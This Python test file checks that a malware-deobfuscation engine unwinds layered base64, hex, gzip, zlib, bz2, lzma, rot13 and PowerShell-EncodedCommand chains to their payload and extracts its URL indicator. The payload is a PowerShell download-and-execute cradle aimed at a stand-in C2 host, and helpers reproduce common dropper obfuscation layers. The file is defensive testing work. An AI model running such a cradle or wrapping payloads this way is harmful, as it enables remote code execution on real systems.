"""Multi-layer chains, measured where nesting actually has meaning.

``nested_chain`` is a declared calibration case class that has been zero for
every component since it was introduced. That is a category error, not
neglect: the calibration evaluator runs one component in isolation, and
``GzipDecoder.can_decode(base64(gzip(x)))`` is False. A nested case authored
against a component would be scored as a *negative recognition* case and would
measure nothing about chaining.

Chaining is a property of the engine's recursion, decoder selection, and
carving working together, so it is measured here, against the engine. Layered
whole-buffer chains, chains carried inside a host file, and chains that mix
compression with transport encodings all have to unwind to the same innermost
payload.

As in the host-embedded corpus, the miss list is a two-way contract: a new
miss fails as a regression, and a fixed miss fails until it is removed.
"""

import base64
import binascii
import bz2
import codecs
import gzip
import hashlib
import lzma
import zlib

import pytest

from titan_decoder.config import Config
from titan_decoder.core.engine import TitanEngine

INNER = b"IEX (New-Object Net.WebClient).DownloadString('http://chain.c2.test/a')"
INNER_SHA256 = hashlib.sha256(INNER).hexdigest()
INNER_URL = "http://chain.c2.test/a"

# Chain id -> why the innermost payload is not recovered. Shrink this list,
# do not grow it.
KNOWN_MISSES = {
    "rot13(base64)": (
        "Rot13Decoder.can_decode deliberately declines base64-shaped input "
        "because ROT13 on a base64 blob is almost always a false positive, and "
        "decode() separately requires the rotation to make text more "
        "English-like. Recovering this would mean speculatively chaining a "
        "rotation into a further decode, which trades a precision guarantee "
        "for an uncommon obfuscation"
    ),
}


def _b64(data: bytes) -> bytes:
    return base64.b64encode(data)


def _powershell_encoded(payload: bytes) -> bytes:
    encoded = base64.b64encode(payload.decode().encode("utf-16le")).decode()
    return f"powershell.exe -NoP -EncodedCommand {encoded}".encode()


def _chains() -> dict[str, bytes]:
    gzipped = gzip.compress(INNER, mtime=0)
    return {
        # Transport wrapped around compression: the ordinary dropper shape.
        "base64(gzip)": _b64(gzipped),
        "base64(zlib)": _b64(zlib.compress(INNER)),
        "base64(bz2)": _b64(bz2.compress(INNER)),
        "base64(lzma)": _b64(lzma.compress(INNER)),
        "base64url(gzip)": base64.urlsafe_b64encode(gzipped),
        "hex(gzip)": binascii.hexlify(gzipped),
        # Transport stacked on transport.
        "base64(base64)": _b64(_b64(INNER)),
        "hex(base64)": binascii.hexlify(_b64(INNER)),
        "base64(hex)": _b64(binascii.hexlify(INNER)),
        "base64(utf16le)": _b64(INNER.decode().encode("utf-16le")),
        "rot13(base64)": codecs.encode(_b64(INNER).decode(), "rot13").encode(),
        # Compression on the outside.
        "gzip(base64)": gzip.compress(_b64(INNER), mtime=0),
        # Three and four layers.
        "base64(base64(gzip))": _b64(_b64(gzipped)),
        "base64(gzip(base64(zlib)))": _b64(
            gzip.compress(_b64(zlib.compress(INNER)), mtime=0)
        ),
        "base64(zlib(base64(gzip)))": _b64(zlib.compress(_b64(gzipped))),
        "base64(gzip(powershell-enc))": _b64(
            gzip.compress(_powershell_encoded(INNER), mtime=0)
        ),
        # Carried inside a host file, which is how they actually arrive.
        "host: base64(gzip)": b"var a = '" + _b64(gzipped) + b"';\n",
        "host: hex(gzip)": b"var a = '" + binascii.hexlify(gzipped) + b"';\n",
        "host: base64(base64(gzip))": b"var a = '" + _b64(_b64(gzipped)) + b"';\n",
        "xml attribute: base64(gzip)": b'<config data="' + _b64(gzipped) + b'"/>',
    }


def _analyze(data: bytes):
    config = Config()
    config.set("max_recursion_depth", 8)
    return TitanEngine(config).run_analysis(data)


@pytest.mark.parametrize("chain_id,data", sorted(_chains().items()))
def test_chain_unwinds_to_the_innermost_payload(chain_id, data):
    report = _analyze(data)
    recovered = any(node["sha256"] == INNER_SHA256 for node in report["nodes"])
    if chain_id in KNOWN_MISSES:
        assert not recovered, (
            f"{chain_id} now unwinds. This is good news: remove it from "
            f"KNOWN_MISSES. Recorded reason was: {KNOWN_MISSES[chain_id]}"
        )
    else:
        assert recovered, f"{chain_id} did not unwind to the innermost payload"


@pytest.mark.parametrize("chain_id,data", sorted(_chains().items()))
def test_recovered_chain_yields_the_indicator(chain_id, data):
    # Reaching the payload node is not the deliverable; the analyst needs the
    # indicator that was buried in it.
    if chain_id in KNOWN_MISSES:
        pytest.skip("chain is a recorded miss")
    assert INNER_URL in _analyze(data)["iocs"].get("urls", [])


def test_known_miss_list_has_no_stale_entries():
    stale = set(KNOWN_MISSES) - set(_chains())
    assert not stale, f"KNOWN_MISSES references chains that no longer exist: {stale}"


def test_chain_recovery_rate_does_not_regress():
    chains = _chains()
    recovered = sum(
        1
        for data in chains.values()
        if any(node["sha256"] == INNER_SHA256 for node in _analyze(data)["nodes"])
    )
    assert recovered == len(chains) - len(KNOWN_MISSES)
    assert recovered / len(chains) >= 0.95
